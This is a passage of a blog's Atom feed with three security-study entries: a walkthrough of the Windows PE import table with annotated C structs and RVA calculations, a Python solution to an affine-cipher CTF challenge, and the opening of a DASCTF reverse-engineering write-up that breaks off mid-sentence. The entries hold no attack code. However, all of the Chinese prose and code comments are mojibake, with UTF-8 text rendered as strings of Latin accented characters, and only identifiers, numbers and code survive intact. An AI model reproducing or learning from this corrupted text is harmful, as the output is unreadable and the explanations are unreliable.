å†è®°å½•åˆ°è¾“å…¥è¡¨ä¸­, ä¾›ç¨‹åºä½¿ç”¨.   å¦å¤–æ‰§è¡Œä¸€ä¸ªæ™®é€šçš„ç¨‹åºä¸€èˆ¬éœ€è¦å¤šä¸ªåº“, é‚£å¯¼å…¥å¤šå°‘åº“, å°±ä¼šæœ‰å¤šå°‘ä¸ªè¾“å…¥è¡¨ç»“æ„ä½“. è¿™å°±æ„æˆäº†ç»“æ„ä½“æ•°ç»„ä¸”ç»“æ„ä½“æ•°ç»„æœ€åä»¥ NULL ç»“æŸ (å³æ¯ä¸ªå¯¼å…¥çš„ DLL éƒ½ä¼šæˆä¸ºæ•°ç»„ä¸­çš„ä¸€é¡¹).</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics</span><br><span class="line">    <span class="comment">// ç”±äºæ˜¯ä¸€ä¸ªè”åˆ, å¦‚æœè¿™æ˜¯è¯¥ç»“æ„ä½“æ•°ç»„çš„æœ€åä¸€</span></span><br><span class="line">    <span class="comment">// é¡¹, é‚£ä½¿ç”¨ Characteristicsæˆå‘˜,ä¸”å€¼ä¸º 0</span></span><br><span class="line">    <span class="comment">// å¦åˆ™ä½¿ç”¨ä¸‹é¢ä¸€ä¸ªæˆå‘˜</span></span><br><span class="line">        </span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    <span class="comment">// INT(import name table)ç»“æ„ä½“æ•°ç»„çš„RVA</span></span><br><span class="line">    <span class="comment">// æ•°ç»„æ¯ä¸ªæˆå‘˜è®°å½•äº†è¦ä½¿ç”¨å‡½æ•°åç§°ä¸åºå·</span></span><br><span class="line">        </span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    </span><br><span class="line">    DWORD   TimeDateStamp;                  </span><br><span class="line">    <span class="comment">// æ˜ è±¡ç»‘å®šå‰ï¼Œè¿™ä¸ªå€¼æ˜¯0ï¼Œç»‘å®šåæ˜¯å¯¼å…¥æ¨¡å—çš„æ—¶é—´æˆ³</span></span><br><span class="line">    <span class="comment">// æ®è¯´å¯ä»¥ç”¨æ¥ç¡®å®šè¾“å…¥è¡¨æ˜¯å¦ç»‘å®šä»è€Œæ˜¯å¦éœ€è¦é‡å®šä½</span></span><br><span class="line"> </span><br><span class="line">    DWORD   ForwarderChain;                 </span><br><span class="line">    <span class="comment">// ä¸­è½¬é“¾, è¾“å…¥å‡½æ•°åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªä¸­è½¬çš„ã€32ä½çš„ç´¢å¼•</span></span><br><span class="line">    <span class="comment">// å¦‚æœæ²¡æœ‰è½¬å‘é“¾, å€¼ä¸º -1</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Name;</span><br><span class="line">    <span class="comment">// DLLæ–‡ä»¶çš„åç§°ï¼ˆ0ç»“å°¾çš„ASCIIç å­—ç¬¦ä¸²ï¼‰çš„32ä½çš„RVA, </span></span><br><span class="line">    <span class="comment">// æ‰€ä»¥ä¸€ä¸ªå¯¼å…¥æ¨¡å—å¯¹åº”ä¸€ä¸ªè¿™æ ·çš„æ•°ç»„</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">    <span class="comment">//IAT(import address table)ç»“æ„ä½“æ•°ç»„çš„RVA</span></span><br><span class="line">    </span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä¸Šé¢çš„ OriginalFirstThunk(INT), FirstThunk(IAT) æˆå‘˜åœ¨PEæ–‡ä»¶åŠ è½½å‰ä¸€èˆ¬æ˜¯éƒ½åŒæ—¶æŒ‡å‘ç›¸åŒåœ°å€çš„ IMAGE_THUNK_DATA æ•°ç»„.ä¸‹é¢æ˜¯ IMAGE_THUNK_DATA32çš„å®šä¹‰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//ä¸€ä¸ªè”åˆ, æ‰€ä»¥æ„å‘³ç€æ¯æ¬¡åªèƒ½ä½¿ç”¨ä¸€ä¸ªæˆå‘˜</span></span><br><span class="line">    <span class="keyword">union</span> </span><br><span class="line">    &#123;</span><br><span class="line">        DWORD ForwarderString;</span><br><span class="line">        <span class="comment">// ä¸­è½¬é“¾,ä¸€ä¸ªDLLæ–‡ä»¶èƒ½è¾“å‡ºä¸å®šä¹‰åœ¨æœ¬DLLæ–‡ä»¶ä¸­å´éœ€ä»å¦ä¸€ä¸ª</span></span><br><span class="line">        <span class="comment">// DLLæ–‡ä»¶ä¸­çš„å‡½æ•°.</span></span><br><span class="line">        </span><br><span class="line">        DWORD Function;</span><br><span class="line">        <span class="comment">// å‡½æ•°çš„åœ°å€</span></span><br><span class="line">        </span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        <span class="comment">// å‡½æ•°çš„åºæ•°. ç”±äºæ‰€æœ‰æˆå‘˜éƒ½æ˜¯åŒä¸€ä¸ªåœ°å€, å½“æœ€é«˜ä½ä¸º1æ—¶è¡¨</span></span><br><span class="line">        <span class="comment">// ç¤ºåˆ—è¡¨ä¸­æ²¡æœ‰å‡½æ•°çš„åå­—ä¿¡æ¯, åªèƒ½é€šè¿‡æœ¬åºæ•°æŸ¥æ‰¾å‡½æ•°,</span></span><br><span class="line">        <span class="comment">// ç”¨ä½16ä½è¡¨ç¤ºçš„åºæ•°, å› ä¸ºæœ€é«˜ä½ä½œä¸ºæ ‡å¿—äº†ã€‚</span></span><br><span class="line">        </span><br><span class="line">        DWORD AddressOfData;</span><br><span class="line">        <span class="comment">// åŒä¸Š, ç”±äºæ‰€æœ‰æˆå‘˜éƒ½æ˜¯åŒä¸€ä¸ªåœ°å€, å½“æœ€é«˜ä½ä¸º0æ—¶, åˆ™ä½¿ç”¨</span></span><br><span class="line">        <span class="comment">// æœ¬æˆå‘˜,ç”¨ä½31ä¸ºè¡¨ç¤º _IMAGE_IMPORT_BY_NAMEç»“æ„çš„RVA</span></span><br><span class="line">        </span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä¸Šé¢ä»‹ç»çš„ AddressOfDataæˆå‘˜çš„ä½<span class="number">31</span>å°±è®°å½•æŒ‡å‘ä¸‹é¢æ‰€ç¤ºçš„ _IMAGE_IMPORT_BY_NAME ç»“æ„ä½“æ•°ç»„çš„åœ°å€(RVA), æ•°ç»„ä¸­æ¯ä¸ªæˆå‘˜çš„å‰<span class="number">2</span>ä¸ªå­—èŠ‚æ˜¯å‡½æ•°çš„åºæ•°, åé¢è·Ÿç€é•¿åº¦ä¸å®šçš„å‡½æ•°åç§°çš„å­—ç¬¦ä¸².</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD Hint;</span><br><span class="line">    <span class="comment">// å‡½æ•°çš„åºæ•°(å³ç´¢å¼•, ä¸è¾“å‡ºè¡¨ä¸­è®²çš„ä¸€æ ·)</span></span><br><span class="line">    BYTE Name[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// å‡½æ•°åç§°æ•°ç»„,è®°å½•å‡½æ•°çš„åç§°. æ•°é‡æœªå®šä¹‰å³é•¿åº¦ä¸å®š.</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p><strong>æ³¨: ä¸Šé¢æ‰€è®²çš„ OriginalFirstThunk æˆå‘˜(æŒ‡é’ˆæ•°ç»„)çš„å€¼æ˜¯ä¸èƒ½æ”¹å†™çš„, é€šè¿‡å®ƒå¯»æ‰¾å‡½æ•°çš„åç§°.   è€Œ FirstThunk æˆå‘˜(æŒ‡é’ˆæ•°ç»„)çš„å€¼åœ¨PEæ–‡ä»¶åœ¨è¢«PEè£…è½½å™¨æ—¶, PEè£…è½½å™¨ä¼šé€šè¿‡ OriginalFirstThunk å¾—åˆ°å‡½æ•°çš„åç§°æˆ–è€…åºæ•°, ç„¶åé€šè¿‡å‡½æ•°åç§°åœ¨åŠ è½½çš„.dllæ–‡ä»¶çš„è¾“å‡ºè¡¨ä¸­æ‰¾åˆ°å‡½æ•°çš„å®é™…åœ°å€, ç„¶åæ›¿æ¢åˆ°FirstThunkçš„ä¸€ä¸ªå€¼.  è£…è½½å®Œæˆå,  FirstThunk æ•°ç»„å°±æŒ‡å‘å‘äº†å‡½æ•°å®é™…çš„åœ°å€.</strong>  å¦å¤–ä¸Šé¢çš„ <strong>TimeDateStamp</strong> æˆå‘˜å¯ä»¥ç”¨æ¥ç¡®å®šè¾“å…¥è¡¨æ˜¯å¦ç»‘å®šä»è€Œæ˜¯å¦éœ€è¦é‡å®šä½, å¦‚æœå®ƒçš„å€¼æ˜¯0, é‚£ä¹ˆè¾“å…¥åˆ—è¡¨æ²¡æœ‰è¢«ç»‘å®š, åŠ è½½å™¨æ€»æ˜¯è¦ä¿®å¤è¾“å…¥è¡¨.  å¦åˆ™è¾“å…¥è¢«ç»‘å®š, ä½†è¯¥æ—¶é—´æˆ³çš„å€¼å¿…é¡»å’Œ.dllæ–‡ä»¶å¤´ä¸­ <strong>TimeDateStamp</strong> çš„ä¸€æ ·, å¦‚æœä¸ä¸€æ ·, ä»ä¼šä¿®æ­£è¾“å…¥è¡¨, å°±ä¼šè¿›è¡Œä¸‹é¢çš„æ­¥éª¤.</p><blockquote><p><strong>å¯¼å…¥å‡½æ•°è¾“å…¥åˆ° IAT çš„é¡ºåº</strong>  </p><p><strong>1.è¯»å– _IMAGE_IMPORT_DESCRIPTORä¸­çš„nameæˆå‘˜, è·å–åº“åç§°å­—ç¬¦ä¸². å¦‚(user32.dll)</strong></p><p><strong>2.è£…è½½ç›¸åº”çš„åº“. LoadLibrary(â€œuser32.dllâ€)</strong></p><p><strong>3.è¯»å–_IMAGE_IMPORT_DESCRIPTORä¸­çš„ OriginalFirstThunk æˆå‘˜, å¾—åˆ° INTåœ°å€.</strong></p><p><strong>4.é€ä¸€è¯»å– INTä¸­æ•°ç»„çš„å€¼, è·å–ç›¸åº”çš„ IMAGE_IMPORT_BY_NAMEåœ°å€(RVA)</strong></p><p><strong>5.ä½¿ç”¨ IMAGE_IMPORT_BY_NAMEçš„Hint (ordinak/åºæ•°)æˆ–nameé¡¹, è·å–ç›¸åº”å‡½æ•°çš„èµ·å§‹åœ°å€.</strong> </p><p><strong>GetProcAddress(â€œå‡½æ•°åç§°â€)</strong></p><p><strong>6.è¯»å– IAT æˆå‘˜, è·å¾—IATåœ°å€.</strong></p><p><strong>7.å°†ä¸Šé¢è·å¾—çš„å‡½æ•°åœ°å€è¾“å…¥ç›¸åº”çš„IATæ•°ç»„å€¼.</strong></p></blockquote><blockquote><p><strong>8.é‡å¤ æ­¥éª¤ 4 -7, ç›´åˆ°INTç»“æŸ.</strong></p></blockquote><p>  <strong>å›¾ç¤ºä¸€ä¸‹, INT ä¸ IAT å…³ç³» (æŠ€æœ¯å¤ªå·®äº†.png).</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519174651226-1590826622691.png" alt="image-20200519174651226"></p><p>  <strong>ä¸‹é¢å®ä¾‹æŸ¥çœ‹ODç¨‹åºçš„è¾“å…¥è¡¨.</strong></p><p>  1.é¦–å…ˆä»PEæ–‡ä»¶å¯é€‰å¤´çš„ DataDirectory[1].VirtualAdress å¾—åˆ°è¾“å…¥è¡¨çš„RVA: <strong>10D000h</strong> åŠsize: <strong>1c87h</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519150821954-1590826622691.png" alt="image-20200519150821954"></p><p>  2.RVA: <strong>10D000h</strong> -&gt; RAW:  <strong>(10D000-10D000+CC400) = CC400h</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519151445783-1590826622692.png" alt="image-20200519151445783"></p><p>  3.æ‰¾åˆ°è¾“å…¥è¡¨. è®°å½•ä¸‹å¯¹åº”æˆå‘˜çš„RVA.</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519153011688-1590826622692.png" alt="image-20200519153011688"></p><p>  4.æŸ¥çœ‹è¯¥è¾“å…¥è¡¨åç§°: <strong>ADVAPI32,DLL</strong>, RVA: <strong>10D9C8</strong> -&gt; RAW: <strong>(10D9C8-10D000+CC400) = CCDC8</strong> </p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519153843705-1590826622692.png" alt="image-20200519153843705"></p><p>  5.æŸ¥çœ‹ <strong>OriginalFirstThunk( INT )</strong>  RVA:<strong>10D0C8</strong> -&gt; RAW: <strong>(10D0C8-10D000+CC400) = CC4C8</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519155230578-1590826622692.png" alt="image-20200519155230578"></p><p>  6.å¯ä»¥çœ‹åˆ°ç¬¬ä¸€æˆå‘˜çš„æœ€é«˜ä½æ˜¯ 0, åˆ™è¯¥å€¼æ˜¯IMAGE_IMPORT_BY_NAMEçš„RVA.(RVA: <strong>10DA33</strong> -&gt; RAW: <strong>CCE33</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519160556676-1590826622692.png" alt="image-20200519160556676"></p><p>  7.æŸ¥çœ‹ FirstThunk( IAT ) RVA: <strong>10D0E4</strong> -&gt; RAW: <strong>(10D0E4-10D000+CC400) = CC4E4</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519163851829-1590826622692.png" alt="image-20200519163851829"></p><p>  8.ä»æ­¥éª¤7å¯ä»¥çœ‹åˆ°, PEè£…è½½å™¨è£…è½½PEæ–‡ä»¶ä¹‹å‰, INTä¸IATå„å…ƒç´ åŒæ—¶æŒ‡å‘ç›¸åŒçš„åœ°å€.</p><p>  9.å†çœ‹ TimeDateStamp æˆå‘˜çš„å€¼ä¸º 0, é‚£å°±æ˜¯è¾“å…¥è¡¨è¢«ç»‘å®š, å¦‚æœä¸è¯¥å¯¹åº” .dll PEæ–‡ä»¶çš„æ–‡ä»¶å¤´çš„ TimeDateStampçš„å€¼ç›¸åŒ,  é‚£è¿™ä¸ªè¾“å…¥è¡¨æ˜¯ä¸éœ€è¦ä¿®æ­£çš„.</p><p>  10.ä»ä¸Šé¢çŸ¥é“ IAT çš„RVA: <strong>10D0E4</strong>.  åº“åç§°: <strong>ADVAPI32,DLL</strong>å¦å¤–ä½¿ç”¨ä¸€ä¸ªODè½½å…¥è¿™ä¸ªODç¨‹åºçœ‹çœ‹. å¯ä»¥çœ‹åˆ°åŠ è½½è¯¥.dllæ–‡ä»¶æ–‡ä»¶çš„RVAæ˜¯ä» <strong>FC0000</strong>å¼€å§‹çš„,  è€ŒæŸ¥çœ‹æœªè¢«PEè£…è½½å™¨è£…è½½å‰çš„çŠ¶æ€, IATçš„RVAæ˜¯ <strong>10D0E4</strong>,æ‰€ä»¥æ˜¾ç„¶è¿™æ˜¯éœ€è¦PEè£…è½½å™¨è£…è½½æ—¶å¯¹è¾“å…¥è¡¨ä¿®æ­£çš„, é‚£ä¹Ÿå¯æ¨å‡ºä»–ä»¬çš„ TimeDateStamp çš„å€¼æ˜¯ä¸åŒçš„</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519164915615-1590826622692.png" alt="image-20200519164915615"></p><blockquote><p>è¾“å…¥è¡¨ä¸è¾“å‡ºè¡¨è”ç³»è¿˜æ˜¯æ¯”è¾ƒå¤§, ç»“åˆèµ·æ¥çœ‹çœ‹æ¸…æ¥šå¾ˆå¤š.</p></blockquote><hr>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x1-åŸºç¡€æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#0x1-åŸºç¡€æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=&quot;0x1 åŸºç¡€æ¦‚å¿µ:&quot;&gt;&lt;/a&gt;0x1 åŸºç¡€æ¦‚å¿µ:&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;EXEæ–‡ä»¶å’ŒDLLæ–‡ä»¶åŸºæœ¬ä¸Šåªæ˜¯è¯­ä¹‰ä¸Šçš„åŒºåˆ«, å”¯ä¸€åŒºåˆ«æ˜¯æœ‰ä¸€ä¸ªæ ‡è¯†å­—æ®µæŒ‡å‡ºEXEæˆ–DLL, å¸¸è§çš„PEæ–‡ä»¶æ ¼å¼æœ‰:DLLï¼ŒEXEï¼ŒOCXï¼ŒSYS, SCR, CPL, OBJç­‰&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;64ä½çš„PEæ–‡ä»¶æ ¼å¼, åšäº†ç®€å•çš„ä¿®é¥°, å«PE32+/PE+, 32ä½å­—æ®µæ‰©å±•ä½64å­—æ®µ&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;PEæ ¼å¼çš„å®šä¹‰åœ°æ–¹åœ¨ &lt;code&gt;winnt.h&lt;/code&gt; å¤´æ–‡ä»¶ä¸­æˆ‘ä»¬èƒ½åœ¨å…¶ä¸­æ‰¾åˆ°PEæ–‡ä»¶çš„å®šä¹‰&lt;/strong&gt;  &lt;strong&gt;&lt;em&gt;å¦‚ä¸‹å›¾VCçš„è·¯å¾„æŸ¥æ‰¾&lt;/em&gt;&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
    
    </summary>
    
    
      <category term="PE" scheme="https://www.Bxnop.cn/categories/PE/"/>
    
    
      <category term="ç³»ç»Ÿ" scheme="https://www.Bxnop.cn/tags/%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Crypto</title>
    <link href="https://www.bxnop.cn/2020/05/29/Crypto/"/>
    <id>https://www.bxnop.cn/2020/05/29/Crypto/</id>
    <published>2020-05-29T09:30:45.000Z</published>
    <updated>2020-05-30T00:58:14.805Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ä»¿å°„å¯†ç "><a href="#ä»¿å°„å¯†ç " class="headerlink" title="ä»¿å°„å¯†ç "></a>ä»¿å°„å¯†ç </h3><blockquote><p>ä»¿å°„å¯†ç æ˜¯æ˜¯åŠ æ³•å¯†ç ä¸ä¹˜æ³•å¯†ç çš„ç»“åˆã€‚å®ƒä¸€ç§è¡¨å•ä»£æ¢å¯†ç ï¼Œå­—æ¯è¡¨çš„æ¯ä¸ªå­—æ¯ç›¸åº”çš„å€¼ä½¿ç”¨ä¸€ä¸ªç®€å•çš„æ•°å­¦å‡½æ•°å¯¹åº”ä¸€ä¸ªæ•°å€¼ï¼Œå†æŠŠå¯¹åº”æ•°å€¼è½¬æ¢æˆå­—æ¯ã€‚åŠ å¯†åå­—æ¯çš„å¤§å°å†™ä¸å˜çš„ã€‚</p></blockquote><ul><li>åŠ å¯†å‡½æ•°ï¼š<strong>E(x) = (ax + b) (mod m)</strong>ï¼Œå…¶ä¸­aä¸mäº’ä¸ºè´¨æ•°ï¼Œè¿™ä¹Ÿæ˜¯èƒ½æ±‚aé€†æ¨¡çš„å¿…è¦æ¡ä»¶ã€‚</li><li>è§£å¯†å‡½æ•°ï¼š<strong>D(x) = a^-1(x - b)(mod m)</strong>ï¼Œå…¶ä¸­ a^-1ä¸ºaåœ¨Zmç¾¤çš„é€†å…ƒã€‚</li></ul><blockquote><p>å½“ a = 1æ—¶ç›¸å½“äºå‡¯æ’’å¯†ç ï¼Œ å…¶å®æ•´ä¸ªå¯†ç å°±æ˜¯å‡¯æ’’å¯†ç é‚£ç§æ„æ€ï¼Œåªæ˜¯åŠ å¼ºç‰ˆå§ã€‚</p><p>å¯¹äºæ±‚é€†å…ƒå¯ä»¥ç›´æ¥ä½¿ç”¨python gmpy2åº“çš„ invert() æ–¹æ³•ã€‚<a id="more"></a></p></blockquote><p>ä»¥GKCTF2020ä¸­ç¬¬ä¸€é“ Crypto ä½œä¸ºç»ƒæ‰‹ã€‚</p><p><img src="/2020/05/29/Crypto/image-20200529175847900.png" alt="image-20200529175847900"></p><ul><li><p>é¦–å…ˆçŸ¥é“ a = 11ï¼Œb = 6ï¼Œm = 26ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"welcylk"</span>:</span><br><span class="line">    flag += chr(((ord(i)<span class="number">-97</span>)<span class="number">-6</span>)*gmpy2.invert(<span class="number">11</span>, <span class="number">26</span>)%<span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">flag = bytes(flag, encoding = <span class="string">"utf-8"</span>) <span class="comment">#å°†strè½¬åŒ–ä¸ºbyteç±»å‹ã€‚</span></span><br><span class="line">flag = base64.b64encode(flag)<span class="comment">#è¿™é‡Œåªèƒ½ä½¿ç”¨byteç±»å‹ã€‚</span></span><br><span class="line"><span class="keyword">print</span> (flag)</span><br></pre></td></tr></table></figure><blockquote><p>pythonä¸­strä¸byteåŒºåˆ«ï¼š</p><p>Python3ä¸¥æ ¼åŒºåˆ†æ–‡æœ¬ï¼ˆstrï¼‰å’ŒäºŒè¿›åˆ¶æ•°æ®ï¼ˆBytesï¼‰ï¼Œæ–‡æœ¬æ€»æ˜¯Unicodeï¼Œç”¨strç±»å‹ï¼ŒäºŒè¿›åˆ¶æ•°æ®åˆ™ç”¨Bytesç±»å‹è¡¨ç¤ºã€‚</p><p>str -&gt; byteï¼š</p><p>s = bytes(s, encoding = â€œutf-8â€)</p><p>s = s.endcode()</p><p>s = s.encode(encoding = â€œutf-8â€)</p><p>byte -&gt; strï¼š</p><p>s = str(s, encoding = â€œutf-8â€)</p><p>s = bytes.decode(s)</p><p>s = s.decode()</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ä»¿å°„å¯†ç &quot;&gt;&lt;a href=&quot;#ä»¿å°„å¯†ç &quot; class=&quot;headerlink&quot; title=&quot;ä»¿å°„å¯†ç &quot;&gt;&lt;/a&gt;ä»¿å°„å¯†ç &lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;ä»¿å°„å¯†ç æ˜¯æ˜¯åŠ æ³•å¯†ç ä¸ä¹˜æ³•å¯†ç çš„ç»“åˆã€‚å®ƒä¸€ç§è¡¨å•ä»£æ¢å¯†ç ï¼Œå­—æ¯è¡¨çš„æ¯ä¸ªå­—æ¯ç›¸åº”çš„å€¼ä½¿ç”¨ä¸€ä¸ªç®€å•çš„æ•°å­¦å‡½æ•°å¯¹åº”ä¸€ä¸ªæ•°å€¼ï¼Œå†æŠŠå¯¹åº”æ•°å€¼è½¬æ¢æˆå­—æ¯ã€‚åŠ å¯†åå­—æ¯çš„å¤§å°å†™ä¸å˜çš„ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;åŠ å¯†å‡½æ•°ï¼š&lt;strong&gt;E(x) = (ax + b) (mod m)&lt;/strong&gt;ï¼Œå…¶ä¸­aä¸mäº’ä¸ºè´¨æ•°ï¼Œè¿™ä¹Ÿæ˜¯èƒ½æ±‚aé€†æ¨¡çš„å¿…è¦æ¡ä»¶ã€‚&lt;/li&gt;
&lt;li&gt;è§£å¯†å‡½æ•°ï¼š&lt;strong&gt;D(x) = a^-1(x - b)(mod m)&lt;/strong&gt;ï¼Œå…¶ä¸­ a^-1ä¸ºaåœ¨Zmç¾¤çš„é€†å…ƒã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;å½“ a = 1æ—¶ç›¸å½“äºå‡¯æ’’å¯†ç ï¼Œ å…¶å®æ•´ä¸ªå¯†ç å°±æ˜¯å‡¯æ’’å¯†ç é‚£ç§æ„æ€ï¼Œåªæ˜¯åŠ å¼ºç‰ˆå§ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äºæ±‚é€†å…ƒå¯ä»¥ç›´æ¥ä½¿ç”¨python gmpy2åº“çš„ invert() æ–¹æ³•ã€‚&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://www.Bxnop.cn/categories/Crypto/"/>
    
    
  </entry>
  
  <entry>
    <title>2020å¹´DASCTFäº”æœˆçº¿ä¸Šèµ›</title>
    <link href="https://www.bxnop.cn/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</id>
    <published>2020-05-23T12:00:53.000Z</published>
    <updated>2020-06-02T03:46:16.562Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse:"></a>Reverse:</h2><h3 id="ViQinere"><a href="#ViQinere" class="headerlink" title="ViQinere"></a>ViQinere</h3><ul><li><p>64ä½elfæ–‡ä»¶, è½½å…¥idaåå‘ç°ä¸ä»¥å¾€çš„ä¸åŒ. å¾ˆå¤šå‡½æ•°éƒ½æ²¡æ˜¾ç¤ºå‡ºæ¥.</p></li><li><p>linuxä¸­è¿è¡Œä¸€ä¸‹, æ˜¾ç¤ºå¯¹flagåŠ å¯†, ç„¶åæ˜¯ä¸€äº›ä¹±ç .  åæ¥ç¾¤é‡Œé€šçŸ¥, è¿™ä¸ªæ˜¯æœ‰é¶æœºçš„.</p></li><li><p>ncè¿æ¥ä¸€ä¸‹, é‚£é¢˜ç›®çš„flagå°±æ˜¯å­˜æ”¾åœ¨æœ¬åœ°çš„, æ–‡ä»¶æ“ä½œå–å‡ºflag, ç»è¿‡åŠ å¯†. <img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523203121150.png" alt="image-20200523203121150"></p><a id="more"></a></li><li><p>æ¥ç€å†åœ¨idaä¸­çœ‹ä¸€ä¸‹, æœ‰å‡ ä¸ªå­—ç¬¦å¾ˆæ‡µ, åé¢æ‰å‘ç°å°±æ˜¯æ”¹å˜è¾“å‡ºå­—ç¬¦ä¸²æ ·å¼, è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆlinuxä¸­è¿è¡Œçš„æ—¶å€™ä¼šæœ‰æ¶‚é¸¦ä¸é—ªåŠ¨, <img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523204020172.png" alt="image-20200523204020172"></p></li><li><p>ç„¶åæ˜¯è¢«æ¶‚é¸¦çš„é‚£ä¸€æ®µå‘äº†, æ˜¾ç¤º <strong>Flag was encrypted by <a href="http://cc.TaQini.space" target="_blank" 